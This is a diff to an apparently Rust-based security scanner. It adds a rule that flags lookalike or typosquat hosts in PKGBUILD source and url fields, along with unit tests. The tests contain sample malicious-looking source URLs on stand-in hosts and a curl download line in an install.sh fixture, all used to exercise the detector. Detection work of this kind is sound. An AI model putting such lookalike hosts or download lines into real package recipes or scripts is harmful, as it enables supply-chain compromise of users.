@@ -373,6 +373,10 @@ fn apply_rules(report: &mut Report, rel: &str, text: &str, inventory_network: bo
     let masked = mask::lines(rel, text);
     let lines: Vec<&str> = text.lines().collect();
     let variables = rules::command_variables(text);
+    let recipe = rel
+        .rsplit('/')
+        .next()
+        .is_some_and(|name| name.eq_ignore_ascii_case("PKGBUILD"));
     // Each line lowercased for the rules, and as written for file names.
     let mut views: Vec<(String, String)> = Vec::with_capacity(lines.len());
     let mut written: Vec<String> = Vec::with_capacity(lines.len());
@@ -380,6 +384,11 @@ fn apply_rules(report: &mut Report, rel: &str, text: &str, inventory_network: bo
         let number = index + 1;
         if inventory_network {
             record_network(report, rel, number, line, &view.quiet);
+        }
+        // What a recipe declares as a source or a homepage is not in
+        // `quiet`; a host there that reads as another is still a finding.
+        if recipe && rules::declares_lookalike_host(&view.code, &view.quiet) {
+            push_finding(report, rel, number, line, RuleId::LookalikeHost);
         }
         // Tabs as spaces, so `sudo<TAB>x` matches like `sudo x`.
         let as_written = view.code.replace('\t', " ");
@@ -1026,6 +1035,46 @@ mod tests {
             true,
         );
         assert_eq!(rules_in(&tls), [RuleId::DisabledTlsVerification]);
+    }
+
+    #[test]
+    fn a_recipes_source_on_a_host_that_reads_as_another_is_found() {
+        let rules_for = |text: &str| {
+            let mut report = Report::new("recipe");
+            analyze_text(&mut report, "PKGBUILD", text, false);
+            (rules_in(&report), report.network.len())
+        };
+        // Sources and the homepage are declarations: makepkg fetches and
+        // checks them, so cleartext there is no finding and no request.
+        assert_eq!(
+            rules_for(
+                "url=\"http://tool.example.test\"\nsource=(\"https://github.com/x/tool/archive/v1.tar.gz\"\n        \"http://xn--mnchen-3ya.example.test/a.patch\")\n"
+            ),
+            (vec![], 0)
+        );
+        // A host that passes for a forge, or for another name by its
+        // letters, is the typosquat itself.
+        for source in [
+            "source=(\"https://github.com.evil.test/x/tool/archive/v1.tar.gz\")\n",
+            "source=(\"tool::https://raw.githubusercontent.com.example-drop.test/x/i.sh\")\n",
+            "source=(\"a.tar.gz\"\n        \"https://xn--pypal-4ve.com/a.patch\")\n",
+            "url=\"https://gitlab.com.example.test/tool\"\n",
+        ] {
+            assert_eq!(
+                rules_for(source),
+                (vec![RuleId::LookalikeHost], 0),
+                "{source}"
+            );
+        }
+        // Outside a recipe such a line is no declaration: a request.
+        let mut report = Report::new("script");
+        analyze_text(
+            &mut report,
+            "install.sh",
+            "curl -fsSLO https://github.com.evil.test/x/v1.tar.gz\n",
+            false,
+        );
+        assert_eq!(rules_in(&report), [RuleId::LookalikeHost]);
     }
 
     #[test]
